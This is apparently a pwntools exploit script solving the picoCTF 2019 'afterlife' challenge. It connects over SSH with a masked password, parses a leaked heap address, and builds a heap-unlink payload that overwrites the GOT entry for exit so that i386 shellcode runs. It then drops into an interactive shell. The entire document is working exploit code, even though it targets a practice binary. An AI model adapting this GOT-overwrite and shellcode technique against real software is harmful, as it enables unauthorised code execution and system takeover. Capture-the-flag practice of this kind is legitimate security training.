from pwn import *

sh = ssh(host='2019shell1.picoctf.com', user='jamesyoung', password='***************')
server = sh.process(['vuln', 'aaaaaaaaaaaaaaaa'], cwd='/problems/afterlife_6_1c6bc56bd64007e5162e284db4d03df5')

leak = int(server.recvuntil('useful...').split('\n')[1])
exit_got = 0x804d02c

payload = ''
payload += p32(exit_got - 12)
payload += p32(leak + 8)
payload += asm('''
  jmp sc
  {}
sc:
  nop
  '''.format('nop\n'*11) + shellcraft.i386.linux.sh())

payload = payload.ljust(256)

server.sendline(payload)
server.interactive()